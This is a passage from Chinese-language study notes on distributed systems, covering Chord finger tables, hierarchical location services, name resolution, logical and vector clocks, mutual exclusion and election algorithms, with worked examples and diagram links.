<li><p>FIFO多播</p>
<p>通信层被强制按照消息发送的顺序传送来自<strong>同一进程</strong>的消息，对不同进程之间的顺序不作要求。</p>
<p><strong>例：</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451772.png" alt="image-20190420152021420"></p>
<p>不保证m1和m3之间的顺序，所以对于P2和P3，只要m1在m2之前，m3在m4之前，就算满足要求。</p>
</li>
<li><p>Causal 因果序多播</p>
</li>
</ul>
<hr>
<h1 id="Chapter-5-命名系统-Naming"><a href="#Chapter-5-命名系统-Naming" class="headerlink" title="Chapter 5 命名系统 - Naming"></a>Chapter 5 命名系统 - Naming</h1><blockquote>
<p>命名是在分布式中表示这个实体，且要访问到这个实体。</p>
</blockquote>
<ul>
<li>访问点：用来实体的一种特殊实体。</li>
<li>地址：访问点的名称。</li>
</ul>
<p>所以<strong>访问点</strong>就是实体的<strong>地址</strong>。</p>
<h2 id="DHT"><a href="#DHT" class="headerlink" title="DHT"></a>DHT</h2><p>全称是Distributed Hash Tables，是P2P环境下最经典的解决方案</p>
<h3 id="Chord"><a href="#Chord" class="headerlink" title="Chord"></a>Chord</h3><p>使用一个m位的标识符空间，把<strong>随机选择</strong>的标识符赋给结点，并把键值赋值给特定实体（任意的东西，比如文件、进程）。</p>
<p><strong>构造Finger table算法：</strong></p>
<p>每个Chord结点维护一个最多有m个实体的指状表(Finger table)，如果用$FT_p$表示结点$p$的指状表，那么有：<br>$$<br>FT_p[i]&#x3D;succ(p + 2^{i -1})<br>$$</p>
<ul>
<li>$p$是当前结点</li>
<li>$i$是指状表的index</li>
<li>$succ(k)$表示k（若结点k存在）或k的下一个<strong>存在</strong>的结点，即$succ(k)\geq k$</li>
</ul>
<p>例：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451773.png" alt="img"></p>
<p>根据$FT_p[i] &#x3D; succ(p + 2^{i - 1})$公式，构造结点p&#x3D;4的Finger table：</p>
<table>
<thead>
<tr>
<th align="center">$i$</th>
<th align="center">$FT_p[i]$</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">$succ(4+1)&#x3D;9$</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">$succ(4 + 2)&#x3D;9$</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">$succ(4+4)&#x3D;9$</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">$succ(4+8)&#x3D;14$</td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">$succ(4+16)&#x3D;20$</td>
</tr>
</tbody></table>
<p><strong>解析算法：</strong></p>
<p>目标：从节点p开始解析key&#x3D;k的结点</p>
<p>搜索节点p的Finger table，从上依次向下搜索，如果一个结点q满足：<br>$$<br>q &#x3D; FT_p[j]\leq k&lt;FT_p[j+1]<br>$$</p>
<p>那么就将该请求转发给结点q；</p>
<p>如果p的Finger table第一个结点就比k还大，即：<br>$$<br>p &lt; k &lt; FT_p[1]<br>$$<br>那么就转发给$FT_p[1]$结点，此节点负责结点k，将k的地址返回给结点p。</p>
<p><strong>例：</strong></p>
<p>还是上面那个图</p>
<p>从结点1开始解析k&#x3D;26：</p>
<ol>
<li>结点1的指状表里，$FT_1[5]&#x3D;18\le26$，将请求转发给18；</li>
<li>结点18的指状表里，$FT_{18}[2]&#x3D;20\le 26 &lt; FT_{18}[3]&#x3D;28$，将请求转发给20；</li>
<li>结点20的指状表里，$FT_{20}[1]&#x3D;21\le26&lt;FT_{20}[2]&#x3D;28$，将请求转发给21；</li>
<li>结点21的指状表里，$21 &lt; 26 &lt;FT_{21}[1]&#x3D;28$，将请求转发给28，该结点负责解析k&#x3D;26；</li>
</ol>
<p>从结点28开始解析k&#x3D;12：</p>
<ol>
<li>结点28的指状表里，$FT_{28}[4]&#x3D;4\le 12&lt;FT_{28}[5]&#x3D;14$，将请求转发给4；</li>
<li>结点4的指状表里，$FT_{4}[3]&#x3D;9\le 12&lt;FT_{4}[4]&#x3D;14$，将请求转发给9；</li>
<li>结点9的指状表里，$FT_{9}[2]&#x3D;11\le 12&lt;FT_{9}[3]&#x3D;14$，将请求转发给11；</li>
<li>结点11的指状表里，$11 &lt; 12 &lt;FT_{11}[1]&#x3D;14$，将请求转发给14，该结点负责解析k&#x3D;12；</li>
</ol>
<h2 id="HLS-HTTP-Live-Streaming"><a href="#HLS-HTTP-Live-Streaming" class="headerlink" title="HLS(HTTP Live Streaming)"></a>HLS(HTTP Live Streaming)</h2><p>网络被划分为一组域。每个域D都有关联的目录节点dir(D)，dir(D)会跟踪域中的实体，形成一颗目录结点树。</p>
<h3 id="HLS结构"><a href="#HLS结构" class="headerlink" title="HLS结构"></a>HLS结构</h3><p>看下面这个图来解释一下HLS吧：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451774.png" alt="image-20190417105530318"></p>
<p>为了跟踪实体E的位置，实体E位于域S中，所以域S的目录结点N含有E在该域中的位置信息。</p>
<p>而在比域S更高一级的域T中，域T的目录结点N’也有实体E的位置信息，但是这个位置信息只有N的指针，也就是要找实体E，就先去找到其子域的目录结点N，然后通过目录节点N找到E。</p>
<p>同理，在比域T更大的域中，那个域的目录节点也有实体E的位置信息，不过这个位置信息只有N’的指针，要找实体E，就要先找N’，然后找到N，最后找到E。</p>
<p>所以顶级域的目录结点，即根（目录）节点，包括全部实体位置信息。</p>
<h3 id="如果一个实体有多个地址"><a href="#如果一个实体有多个地址" class="headerlink" title="如果一个实体有多个地址"></a>如果一个实体有多个地址</h3><p>实体可以拥有多个地址，比如被复制了，实体在域D1和域D2中都有地址，那么同时包含D1和D2的最小域目录结点将有两个指针，每个指针都指向一个包含地址的子域。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451775.png" alt="image-20190417110841084"></p>
<h3 id="HLS查询操作"><a href="#HLS查询操作" class="headerlink" title="HLS查询操作"></a>HLS查询操作</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451776.png" alt="image-20190417111032790"></p>
<p>现在希望能定位实体E的位置信息，那么就向当前域的目录结点发送查找请求：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if 目录结点找到了实体E的位置信息:</span><br><span class="line">	if 找到的是子域目录结点的地址</span><br><span class="line">		把查找请求转发给子域的目录结点</span><br><span class="line">	else </span><br><span class="line">		找到了叶节点，把地址返回给请求的客户</span><br><span class="line">else</span><br><span class="line">	把查找请求转发给父节点</span><br></pre></td></tr></table></figure>

<p>最差情况是一直找不到，向上转发直到根节点。</p>
<h3 id="插入操作"><a href="#插入操作" class="headerlink" title="插入操作"></a>插入操作</h3><p><strong>这块不要看中文教材！因为教材把图用错了！(真的坑)</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451777.png" alt="image-20190417113202813"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451778.png" alt="image-20190417113211529"></p>
<p>如果要插入实体E，将其所在域的目录节点加入实体E的地址，然后一路向上转发。</p>
<p>如果这个目录结点不知道E，就存储一下子域地址，直到一个节点知道E的位置或者到根节点就终止。</p>
<p><strong>为啥刚刚插入的实体E，可能有的结点已经知道E的位置了呢？</strong></p>
<p>因为E可能是复制过来的，正如上面讲的有多个实体，包含两个E的最小域的目录节点会有E的两个地址，而再往上一层，就只有E的一个地址了(指向两个E的最小域的目录节点)，到这里就停止向上传递。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451779.png" alt="image-20190417113836041"></p>
<p>这是中文教材的配图，怎么都看不懂这两条线啥意思，原来中文教材用成查询的图了。</p>
<h3 id="HLS思想"><a href="#HLS思想" class="headerlink" title="HLS思想"></a>HLS思想</h3><p>若用root node实现扁平化直接管理，根节点负载过大，且一旦崩溃，整个集群系统瘫痪。因此，使用分治思想，不同dom内实现自治。</p>
<h2 id="名称空间的实现-Name-Space-Implementation"><a href="#名称空间的实现-Name-Space-Implementation" class="headerlink" title="名称空间的实现 - Name Space Implementation"></a>名称空间的实现 - Name Space Implementation</h2><blockquote>
<p>Basic issue</p>
<p>Distribute the name resolution process as well as name space management across multiple machines, by distributing nodes of the naming graph.</p>
</blockquote>
<h3 id="Consider-a-hierarchical-naming-graph-and-distinguish-three-levels"><a href="#Consider-a-hierarchical-naming-graph-and-distinguish-three-levels" class="headerlink" title="Consider a hierarchical naming graph and distinguish three levels:"></a>Consider a hierarchical naming graph and distinguish three levels:</h3><ul>
<li><strong>Global level:</strong><br>Consists of the high-level directory nodes. Main aspect is that these directory nodes have to be jointly managed by different administrations</li>
<li><strong>Administrational level:</strong><br>Contains mid-level directory nodes that can be grouped in such a way that each group can be assigned to a separate administration.</li>
<li><strong>Managerial level:</strong><br>Consists of low-level directory nodes within a single administration. Main issue is effectively mapping directory nodes to local name servers.</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451780.png" alt="Globalimage-20190417153950223"></p>
<p>从上至下依次分为了Global level, Administrational level and Managerial level。</p>
<p>Global层几乎不怎么变化，Administrational层变化多些，Managerial层变化最多。</p>
<p>具体区别看下面这个表：</p>
<table>
<thead>
<tr>
<th align="left">Item</th>
<th align="left">Global</th>
<th align="left">Administrational</th>
<th align="left">Managerial</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Geographical scale of network</td>
<td align="left">Worldwide</td>
<td align="left">Organization</td>
<td align="left">Department</td>
</tr>
<tr>
<td align="left">Total number of nodes</td>
<td align="left">Few</td>
<td align="left">Many</td>
<td align="left">Vast numbers</td>
</tr>
<tr>
<td align="left">Responsiveness to lookups</td>
<td align="left">Seconds</td>
<td align="left">Milliseconds</td>
<td align="left">Immediate</td>
</tr>
<tr>
<td align="left">Update propagation</td>
<td align="left">Lazy</td>
<td align="left">Immediate</td>
<td align="left">Immediate</td>
</tr>
<tr>
<td align="left">Number of replicas</td>
<td align="left">Many</td>
<td align="left">None or few</td>
<td align="left">None</td>
</tr>
<tr>
<td align="left">Is client-side caching applied?</td>
<td align="left">Yes</td>
<td align="left">Yes</td>
<td align="left">Sometimes</td>
</tr>
</tbody></table>
<h2 id="名称解析-Name-Resolution"><a href="#名称解析-Name-Resolution" class="headerlink" title="名称解析 - Name Resolution"></a>名称解析 - Name Resolution</h2><h3 id="迭代名称解析-Iterative-Name-Resolution"><a href="#迭代名称解析-Iterative-Name-Resolution" class="headerlink" title="迭代名称解析 - Iterative Name Resolution"></a>迭代名称解析 - Iterative Name Resolution</h3><ul>
<li>resolve(dir,[name1,…,nameK]) is sent to Server0 responsible for dir</li>
<li>Server0 resolves resolve(dir,name1) → dir1, returning the identification (address) of Server1, which stores dir1.</li>
<li>Client sends resolve(dir1,[name2,…,nameK]) to Server1, etc.</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451781.png" alt="image-20190417162116644"></p>
<h3 id="递归名称解析-Recursive-Name-Resolution"><a href="#递归名称解析-Recursive-Name-Resolution" class="headerlink" title="递归名称解析 - Recursive Name Resolution"></a>递归名称解析 - Recursive Name Resolution</h3><ul>
<li>resolve(dir,[name1,…,nameK]) is sent to Server0 responsible for dir</li>
<li>Server0 resolves resolve(dir,name1) →dir1, and sends resolve(dir1,[name2,…,nameK]) to Server1, which stores dir1.</li>
<li>Server0 waits for the result from Server1, and returns it to the client.</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451782.png" alt="image-20190417162203036"></p>
<h3 id="Scalability-Issues"><a href="#Scalability-Issues" class="headerlink" title="Scalability Issues"></a>Scalability Issues</h3><p><em><strong>Issue 1</strong></em></p>
<p>因为名称解析都需要先解析高级域名，所以高层服务器的需要每秒处理大量处理请求。</p>
<p><em><strong>Solution:</strong></em></p>
<p>因为在global层和administrational层的结点内容几乎不会变，所有我们可以把这些服务器的内容广泛地复制到多个服务器中，这样名称解析可以就近处理，加快速度，如果找不到再发请求到高层服务器。</p>
<p><em><strong>Issue 2</strong></em></p>
<p><em><strong>Geographical scalability</strong></em> - 地域可扩展性，即名称解析服务要可以在很大的地理距离内进行扩展。</p>
<p>如果客户和服务器端离的比较远，那么最好采用递归名称解析，因为客户端只和服务器通信一次即可取得结果，而迭代名称解析需要通信多次。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451783.png" alt="image-20190417163715938"></p>
<hr>
<h1 id="Chapter-6-同步化-Synchronization"><a href="#Chapter-6-同步化-Synchronization" class="headerlink" title="Chapter 6 同步化 - Synchronization"></a>Chapter 6 同步化 - Synchronization</h1><h2 id="时钟同步-Clock-Synchronization"><a href="#时钟同步-Clock-Synchronization" class="headerlink" title="时钟同步 - Clock Synchronization"></a>时钟同步 - Clock Synchronization</h2><h3 id="Berkeley算法"><a href="#Berkeley算法" class="headerlink" title="Berkeley算法"></a>Berkeley算法</h3><p>Berkeley UNIX系统的时间服务器(实际上是时间守护程序)是主动的，定期询问每台机器的时间。然后算出一个平均时间，并告诉所有其他机器将它们的时钟拨快&#x2F;拨慢一个新的时间。</p>
<p>Berkeley算法除了第一次传播时间守护程序的广播外，传播的都是<strong>相对时间</strong>，如下图的b和c，目的是为了<strong>减小误差</strong>。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451784.png" alt="image-20190420021051196"></p>
<p><strong>感谢王海杰同学发现并提醒我中文书这里时间写错了。</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451785.png" alt="image-20190417195809532"></p>
<h2 id="逻辑时钟-Logical-clocks"><a href="#逻辑时钟-Logical-clocks" class="headerlink" title="逻辑时钟 - Logical clocks"></a>逻辑时钟 - Logical clocks</h2><h3 id="Lamport逻辑时钟"><a href="#Lamport逻辑时钟" class="headerlink" title="Lamport逻辑时钟"></a>Lamport逻辑时钟</h3><h4 id="先发生关系-Happen-Before-HB-Relation"><a href="#先发生关系-Happen-Before-HB-Relation" class="headerlink" title="先发生关系 - Happen-Before (HB) Relation"></a>先发生关系 - Happen-Before (HB) Relation</h4><p>表达式：a→b读作”a在b之前发生”，意思是所有进程一直认为事件a先发生，然后事件b才发生。</p>
<p>HB关系准则：</p>
<ol>
<li><p>$If \exist processp_i : a \ comes \ before \ b,then\ a\rightarrow b$</p>
<p>如果a和b是同一进程中的两个事件，且a在b之前发生，则a<em>→</em>b为真</p>
</li>
<li><p>For any message m, <em><strong>send(m)* → *receive(m)</strong></em></p>
<p>如果a是一个进程中<strong>发送</strong>消息的事件，b是另一个进程中<strong>接受</strong>这个消息的事件，那么a<em>→</em>b为真</p>
</li>
<li><p>IF a, b and c are events such that, <em><strong>a* → <em>b</em> and <em>b</em> → <em>c</em>, then <em>a</em> → *c</strong></em></p>
<p>如果a→b，b→c，那么a→c</p>
</li>
</ol>
<p><em><strong>Problem</strong></em>：</p>
<p>How do we maintain a global view on the system’s behavior that is consistent with the happened before relation?</p>
<p>如何使用HB Relation来维持系统时间一致？</p>
<p><em><strong>Solution:</strong></em><br>attach a timestamp 𝐶(𝑒) to each event e, satisfying the following properties:</p>
<p>对于每个事件a，我们都能为它分配一个所有进程都认可的时间值𝐶(𝑎)</p>
<ol>
<li><p>If a and b are two events in the same process, and a→b, then we demand that 𝐶(𝑎)&lt;𝐶(𝑏).</p>
<p>如果a比b先，那么应该是𝐶(𝑎)&lt;𝐶(𝑏).</p>
</li>
<li><p>If a corresponds to sending a message m, and b to the receipt of that message, then also C(a) &lt; C(b).</p>
<p>若a是发送的，b是接受的，那么应该是𝐶(𝑎)&lt;𝐶(𝑏).</p>
</li>
</ol>
<p>若上述两条最后出现了𝐶(𝑎)≥𝐶(𝑏)，那么执行操作𝐶(𝑏)&#x3D;𝐶(𝑎)+1，使得𝐶(𝑎)&lt;𝐶(𝑏).</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451786.png" alt="image-20190417211008993"></p>
<p>m3是从P3发送给P2，发送时间是P3的60，接受时间是P2的56，这不符合发送时间&lt;接收时间，所以把接受时间改为发送时间+1，即61。m4同理。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451787.png" alt="image-20190417211446492"></p>
<p><strong>注意：调整时钟操作发生在中间件层。</strong></p>
<h3 id="全序多播"><a href="#全序多播" class="headerlink" title="全序多播"></a>全序多播</h3><p><strong>所谓的全序，就是所有进程统一顺序</strong>，只要最后所有进程的事件执行顺序相同就行。</p>
<ol>
<li>进程先给消息打上一个当前逻辑时间作为时间戳，然后把这个消息放进自己的本地队列中，再将这个消息发送给其他进程；</li>
<li>进程收到来自其他进程的消息后，也把这个消息放进本地队列中，按时间戳排序。</li>
</ol>
<p>例：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451788.jpg" alt="IMG_20190417_214308"></p>
<p>A和B的时间不同，A在本地时间3发出消息，B在本地时间6发出消息。</p>
<p>最后双方的本地队列的顺序都是先执行A的消息，再执行B的消息。</p>
<p>但是这样永远是时间快的进程先执行，时间慢的后执行，所以B发送给A的时候，要使用Lamport逻辑时钟准则调整A的时钟。</p>
<p><strong>全序多播开销很大！</strong></p>
<p>字丑勿见怪</p>
<h3 id="向量时钟"><a href="#向量时钟" class="headerlink" title="向量时钟"></a>向量时钟</h3><p>但是向量时钟可以捕获<strong>因果关系</strong>。</p>
<p>每个进程都维护一个向量𝑉𝐶，比如进程𝑃𝑖维护的向量就是𝑉𝐶𝑖，有两个性质：</p>
<ol>
<li>𝑉𝐶𝑖[𝑖]表示目前为止，本进程𝑃𝑖发生了多少事件；</li>
<li>𝑉𝐶𝑖[𝑗]&#x3D;𝑘表示进程𝑃𝑖知道𝑃𝑗已经发生了k个事件。</li>
</ol>
<p>执行步骤：</p>
<ol>
<li>𝑃𝑖进程执行一个事件之前，先把自身的向量里第i个分量(也就是𝑉𝐶𝑖[𝑖])自增1；</li>
<li>𝑃𝑖进程发送一个消息m给𝑃𝑗时，把m的时间戳ts(m)设置为等于𝑉𝐶𝑖；</li>
<li>接受消息m时，进程𝑃𝑗通过为每个k设置𝑉𝐶𝑗[𝑘]&#x3D;max(𝑉𝐶𝑗[𝑘],𝑡𝑠(𝑚)[𝑘])来调整自己的向量。然后，𝑃𝑗要执行这个事件，如步骤1所示，把𝑉𝐶𝑗[𝑖]自增1.</li>
</ol>
<h4 id="强制因果序多播"><a href="#强制因果序多播" class="headerlink" title="强制因果序多播"></a>强制因果序多播</h4><p><strong>设计思想：</strong></p>
<p>我懂的不能比你少，不然万一有其他消息还没来，你的消息就插队了，所以我不能收你的消息。</p>
<p><strong>具体操作：</strong></p>
<p>进程𝑃𝑖发给进程𝑃𝑗一个时间戳为𝑡𝑠(𝑚)的消息m。如果不满足以下两个条件，这个消息就不交付给应用层，直到满足条件为止：</p>
<ol>
<li>𝑡𝑠(𝑚)[𝑖]&#x3D;𝑉𝐶𝑗[𝑖]+1</li>
<li>𝑡𝑠(𝑚)[𝑘]≤𝑉𝐶𝑗[𝑘]  𝑓𝑜𝑟𝑎𝑙𝑙𝑘≠𝑖</li>
</ol>
<p>关于你刚刚发的消息，可以比我多知道一条消息。毕竟他发的，肯定比我多了解一条；</p>
<p>但是关于其他消息，你知道的不可以比我多，不然我就是还有其他消息没收到，等我收到其他消息后再处理这个消息。</p>
<p><strong>这本中文书你还能再坑一点吗？</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451789.png" alt="image-20190418102502861"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451790.png" alt="image-20190418104322665"></p>
<p><strong>例：</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451791.png" alt="image-20190418104501554"></p>
<ol>
<li>𝑃0先发送消息m，自身先把𝑉𝐶0[0]自增1，消息的时间戳为(1, 0, 0)；</li>
<li>𝑃1收到消息m，当时𝑃1的向量是(0, 0, 0)，只有第一维比自己多1个，其他都和自己相同，所以满足上述条件，消息交付应用层；</li>
<li>𝑃1发送消息m*，自身先把𝑉𝐶1[1]自增1，消息的时间戳为(1, 1, 0)， 𝑃0接收此消息；</li>
<li>𝑃2不接收𝑃1发送的消息，因为此时𝑃2的向量是(0, 0, 0)，𝑃0的消息还没收到，所以延迟接受𝑃1的消息；</li>
<li>等到𝑃0的消息到来，𝑃2调整过自身的向量后，才可以接收𝑃1的消息。</li>
</ol>
<p>例2：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451792.png" alt="image-20190418105824022"></p>
<h2 id="互斥-Mutual-Exclusion"><a href="#互斥-Mutual-Exclusion" class="headerlink" title="互斥 - Mutual Exclusion"></a>互斥 - Mutual Exclusion</h2><p>分布式系统情况下，进程将需要同时访问相同的资源，互斥算法就是保证进程之间能够互斥访问资源。</p>
<h3 id="集中式算法"><a href="#集中式算法" class="headerlink" title="集中式算法"></a>集中式算法</h3><p>选举一个进程作为协调者。其他进程想访问资源都要问他。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451793.png" alt="image-20190418203632964"></p>
<p>进程3是协调者，进程1想访问资源，问一下进程3，进程3说ok。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451794.png" alt="image-20190418203738517"></p>
<p>进程2也想访问资源，进程3不理进程2，但是把进程2放到等待队列里。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451795.png" alt="image-20190418204013915"></p>
<p>进程1用完资源后，向进程3说一声他用完了。进程3便向等待队列的队首进程说一声，可以用资源了。</p>
<h3 id="非集中式算法"><a href="#非集中式算法" class="headerlink" title="非集中式算法"></a>非集中式算法</h3><blockquote>
<p>这个Decentralized一点意义都没有！开销大！神经病！书上举这个例子就是说不要什么事都尝试Decentralized。Google云计算的也只是一个协调者，协调者挂了就选举。多协调者没好处，只会扯皮！</p>
<p>——丁箐</p>
</blockquote>
<h3 id="分布式算法"><a href="#分布式算法" class="headerlink" title="分布式算法"></a>分布式算法</h3><p>当一个进程想要某个资源，就向所有其他进程发送消息询问。比如进程A想要一个资源，就向其他进程发消息询问，进程B就收到了A的消息。</p>
<ul>
<li><p>若B不想用这个资源，就给A回一个OK。</p>
<p>“Yes, you can have it. I don’t want it, so what do I care?”</p>
</li>
<li><p>若B已经在用这个资源了，就不理A，但是把A的请求消息放进等待队列中。</p>
<p>“Sorry, I am using it. I will save your request, and give you an OK when I am done with it.”</p>
</li>
<li><p>若B也想用这个资源，但是还没开始用，那么就把A发送来的消息时间戳和自己将要广播消息的时间戳进行比较，谁发的早谁获得资源。<strong>这里的一致性是由Lamport逻辑时钟保证的。</strong></p>
<p>竞争失败的进程会给获得资源的进程发个OK，然后把自己放进等待队列里。</p>
<ul>
<li><p>If the incoming message has a lower timestamp, <strong>the receiver sends back an OK.</strong></p>
<p>“I want it also, but you were first.”</p>
</li>
<li><p>If it’s own message has a lower timestamp, <strong>it queues it up.</strong></p>
<p>“Sorry, I want it also, and I was first.”</p>
</li>
</ul>
</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451796.png" alt="image-20190418214710376"></p>
<h3 id="令牌环算法-A-Token-Ring-Algorithm"><a href="#令牌环算法-A-Token-Ring-Algorithm" class="headerlink" title="令牌环算法 - A Token Ring Algorithm"></a>令牌环算法 - A Token Ring Algorithm</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451797.png" alt="image-20190418220302174"></p>
<p>在网络中，环的顺序是无序的，但是可以用软件的方法构造成一个有序的逻辑环。环的顺序和进程在总线上的位置是无关的。</p>
<p>令牌(token)在进程间相互传递，拥有令牌的进程可以访问共享资源，用完就向下传。</p>
<p>如果某个进程收到了令牌但不用访问资源就传下去。</p>
<p><strong>不允许某一个进程用完资源后，使用同一令牌继续访问该资源。</strong></p>
<p><strong>整个分布式系统中只有一个令牌</strong>，如果令牌毁了，比如拥有令牌的进程挂掉了，那么就需要重启一个复杂的分布式进程创建新令牌。</p>
<h3 id="四种算法的比较"><a href="#四种算法的比较" class="headerlink" title="四种算法的比较"></a>四种算法的比较</h3><p>四种互斥算法每次进&#x2F;出需要的消息数以及进入前的延迟(按消息数)</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451798.png" alt="image-20190421215739105"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451799.png" alt="image-20190421215840729"></p>
<h2 id="选举算法-Election-Algorithms"><a href="#选举算法-Election-Algorithms" class="headerlink" title="选举算法 - Election Algorithms"></a>选举算法 - Election Algorithms</h2><p>很多分布式的机子，要选举出一个协调者。</p>
<p>或者协调者崩了，要重选一个协调者。</p>
<p><strong>选举算法就是选一个协调者的算法。</strong></p>
<h3 id="欺负算法-Bully-Algorithm"><a href="#欺负算法-Bully-Algorithm" class="headerlink" title="欺负算法 - Bully Algorithm"></a>欺负算法 - Bully Algorithm</h3><p>当任何一个进程发现协调者不再响应请求时，它就发起一次选举</p>
<ol>
<li>P向所有编号比它大的进程发送一个ELECTION消息</li>
<li>如果无人响应，P获胜并称为协调者</li>
<li>如果有编号比它大的进程响应，则由响应者接管选举工作。P的工作完成。</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451800.png" alt="image-20190418222917752"></p>
<p>当有ELECTION消息到达时，接收者回送一个OK消息给发送者，表明自己仍在运行，并接管选举工作。最终除了一个进程外，其他进程都将放弃，这个进程就是新的协调者。它将获胜的消息发送给所有进程。</p>
<p>当以前的一个崩溃了的进程恢复过来时，它将主持一次选举。</p>
<p><strong>总结一下：</strong></p>
<p>这个算法就是哪个进程的编号大且没崩盘哪个就是协调者，因为编号小的都要问编号大的，编号大的只要没崩都说接管选举任务。而且崩盘的进程一旦恢复了，就会广播一个COORDINATOR消息，表示大哥回来了，又接管协调者的任务。</p>
<h3 id="环算法-Election-in-a-Ring"><a href="#环算法-Election-in-a-Ring" class="headerlink" title="环算法 - Election in a Ring"></a>环算法 - Election in a Ring</h3><p>会有2个消息，各绕环一圈。</p>
<p><strong>step 1 发送ELECTION message：</strong></p>
<p>当任何一个进程发现协调者不工作时，<strong>它就构造一个带有它自己进程号的ELECTION消息</strong>，发送给后继者。如果后继者崩溃，就跳过崩溃的进程，继续往下走，直到找到一个正在运行的进程。每一步，发送者都将自己的进程号加入到消息中，使自己也成为协调者的候选人。</p>
<p>最终消息返回到发起选举的进程。当发起者接收到包含自己号的消息，识别出这个事件，<strong>选出进程号最大的作为协调者</strong>。</p>
<p><strong>step 2 发送COORDINATOR message：</strong></p>
<p>第一则的消息转变为COORDINATOR，并再一次绕环运行，<strong>通知大家谁是新的协调者以及新环中的成员</strong>。消息循环一周后被删除，然后每个进程恢复正常工作。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451801.png" alt="image-20190418224020806"></p>
<p>这个图是说当进程2和5同时发现协调者7崩盘了，使用环选举算法选出新的协调者。</p>
<p>这个图在演示Election message是怎么循环的，现在还没有4到5的箭头，是因为还没循环到那里。</p>
<h3 id="无线系统下的选举算法"><a href="#无线系统下的选举算法" class="headerlink" title="无线系统下的选举算法"></a>无线系统下的选举算法</h3><p>选定一个源节点，在网络拓扑结构中构造树形结构，源节点就是树的根结点。</p>
<p>例：</p>
<ol>
<li>选定a是源节点；</li>
<li>a向相邻结点(b和c)发生ELECTION消息；</li>
<li>b和c第一次接受到ELECTION消息，认为a是他们的父结点；</li>
<li>b和c再次向相邻结点发送ELECTION消息，此时g结点一定都会受到b和c的ELECTION消息，谁的消息先到谁就是g的父结点；</li>
<li>如此递给构造树形结构，直到叶节点；</li>
<li>从叶节点开始，逐层向上发送自身情况，每个非叶子节点收到子节点情况汇报后，会将子结点情况与自身情况相比较，选择出最优结点，再向上汇报。这样根结点(源节点)就知道哪个结点是最优的。从而选出这个结点是协调者。</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451802.png" alt="image-20190419105744830"></p>
<p><strong>总结：</strong></p>
<ol>
<li>父结点向子节点广播ELECTION消息，直到最底层。</li>
<li>从最底层开始每个结点向父结点报告自己的容量和节点号，又父结点选择容量大的作为最佳结点，继续再向自己的父结点报告。最终到根节点选出一个容量最大的最佳结点。</li>
</ol>
<hr>
<h1 id="Chpater-7-一致性和复制-Consistency-amp-Replication"><a href="#Chpater-7-一致性和复制-Consistency-amp-Replication" class="headerlink" title="Chpater 7 一致性和复制 - Consistency &amp; Replication"></a>Chpater 7 一致性和复制 - Consistency &amp; Replication</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="为什么要进行数据的复制？"><a href="#为什么要进行数据的复制？" class="headerlink" title="为什么要进行数据的复制？"></a>为什么要进行数据的复制？</h3><p>进行复制是为了增强系统的<strong>可靠性</strong>和<strong>性能</strong>。</p>
<ul>
<li>可靠性：更好的防止数据被破坏。</li>
<li>性能：当分布式系统需要在服务器数量和地理区域上进行扩展时，就需要复制来提高性能。</li>
</ul>
<h3 id="复制带来的问题-？"><a href="#复制带来的问题-？" class="headerlink" title="复制带来的问题 ？"></a>复制带来的问题 ？</h3><p>一致性问题</p>
